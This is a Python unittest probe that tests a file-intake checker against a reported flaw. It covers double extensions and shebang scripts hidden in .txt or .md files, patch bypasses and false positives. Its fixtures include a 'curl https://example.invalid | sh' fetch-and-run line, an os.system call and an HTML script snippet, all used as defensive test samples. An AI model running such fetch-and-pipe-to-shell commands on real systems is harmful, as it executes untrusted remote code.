"""Skeptic probe for CR-F2 (double extensions / shebang). No network.

INTAKE_TREE=<dir> selects which copy of the checker and house tests to load:
  current  -> origin/main checker (383 lines)
  e495837  -> the task-stated head (296 lines, the finder's line numbers)
  patched  -> origin/main checker + the finder's F2-only hunks

Every method reuses the house FakeAPI fixture verbatim. The tests marked
`_reproduce` confirm what the finder observed. The tests marked `_bypass` show
the patched checker still returns green for the same bytes under a name without
an inner suffix, or with the shebang not in the first two bytes. The tests marked
`_false_positive` show plausible legitimate names the patch would newly refuse.
"""
import importlib.util
import os
import sys
import unittest
from pathlib import Path

TREE = Path(__file__).resolve().parent / os.environ.get('INTAKE_TREE', 'current')
spec = importlib.util.spec_from_file_location('house_tests', TREE / 'tests/test_public_intake.py')
house = importlib.util.module_from_spec(spec)
spec.loader.exec_module(house)
intake = house.intake
assert Path(intake.__file__).resolve() == (TREE / 'tests/../tools/public_intake_check.py').resolve(), intake.__file__
PATCHED = hasattr(intake, 'REFUSED_INNER_SUFFIXES')

PY_SOURCE = b'import os\nos.system("id")\n'
SH_SOURCE = b'#!/bin/sh\ncurl https://example.invalid | sh\n'


class Probe(unittest.TestCase):
    setUp = house.IntakeTests.setUp
    save = house.IntakeTests.save
    install = house.IntakeTests.install
    install_source = getattr(house.IntakeTests, "install_source", None)  # absent in the e495837 fixture
    run_check = house.IntakeTests.run_check
    reject = house.IntakeTests.reject

    def green(self):
        result = self.run_check()
        self.assertEqual(result['lane'], 'incoming')
        self.assertEqual(result['scientific_effect'], 'NONE')
        return result

    def add(self, name, raw):
        self.raw[name] = raw
        self.save()

    # -- what the finder observed, re-run from a fresh copy --------------------------------
    def test_reproduce_double_extension_txt_is_green_on_current(self):
        self.add('run.py.txt', PY_SOURCE)
        if PATCHED:
            self.reject('refused file type')
        else:
            self.green()

    def test_reproduce_shebang_txt_is_green_on_current(self):
        self.add('setup.txt', SH_SOURCE)
        if PATCHED:
            self.reject('shebang')
        else:
            self.green()

    # -- the same bytes under a name without an inner suffix: green before AND after -------
    def test_bypass_same_python_bytes_as_run_txt_green_in_both(self):
        self.add('run.txt', PY_SOURCE)
        self.green()

    def test_bypass_same_python_bytes_as_run_md_green_in_both(self):
        self.add('run.md', PY_SOURCE)
        self.green()

    def test_bypass_notebook_json_without_inner_suffix_green_in_both(self):
        self.add('notebook.json', b'{"cells": [], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}\n')
        self.green()

    def test_bypass_html_bytes_as_page_md_green_in_both(self):
        self.add('page.md', b'<html><body><script>alert(1)</script></body></html>\n')
        self.green()

    def test_bypass_shebang_after_leading_newline_green_in_both(self):
        self.add('setup.txt', b'\n' + SH_SOURCE)
        self.green()

    def test_bypass_shebang_after_comment_green_in_both(self):
        self.add('setup.txt', b'# replay helper\n' + SH_SOURCE)
        self.green()

    def test_bypass_python_without_shebang_green_in_both(self):
        self.add('setup.txt', PY_SOURCE)
        self.green()

    # -- RESULT.md must describe 'command or method' (CONTRIBUTING step 3): code in text is legitimate
    def test_result_md_with_fenced_script_green_in_both(self):
        self.raw['RESULT.md'] = (b'# Result\nReplayed with:\n\n```sh\n#!/bin/sh\npython3 tools/replay.py --exact\n```\n'
                                 b'\n```python\nimport os\nprint(os.getcwd())\n```\nScientific effect NONE.\n')
        self.save()
        self.green()

    # -- plausible legitimate names the patch newly refuses (wrong rejection) ----------------
    def test_false_positive_dotted_abbreviations_refused_only_when_patched(self):
        for name, raw in [('series.ts.csv', b't,v\n0,1\n'),          # ts = time series / timestamp
                          ('README.pl.md', b'# Wynik\nefekt naukowy NONE\n'),  # pl = Polish translation
                          ('notes.so.txt', b'significance order notes\n'),   # so = arbitrary abbreviation
                          ('compare.js.md', b'# Jensen-Shannon comparison\n'),  # js = Jensen-Shannon
                          ('bound.rb.json', b'{"rb": 0.5}\n')]:            # rb = right boundary
            with self.subTest(name=name):
                old = self.raw.copy()
                self.add(name, raw)
                if PATCHED:
                    self.reject('refused file type')
                else:
                    self.green()
                self.raw = old

    # -- existing controls still hold in every tree ------------------------------------------
    def test_bare_refused_extensions_still_refused_in_both(self):
        for name in ['run.py', 'notebook.ipynb', 'page.html', 'plot.svg', 'bundle.tar.gz']:
            with self.subTest(name=name):
                old = self.raw.copy()
                self.add(name, b'payload')
                self.reject('unsupported file extension')
                self.raw = old


if __name__ == '__main__':
    print(f'[probe] tree={TREE.name} patched={PATCHED} checker={intake.__file__}', file=sys.stderr)
    unittest.main()
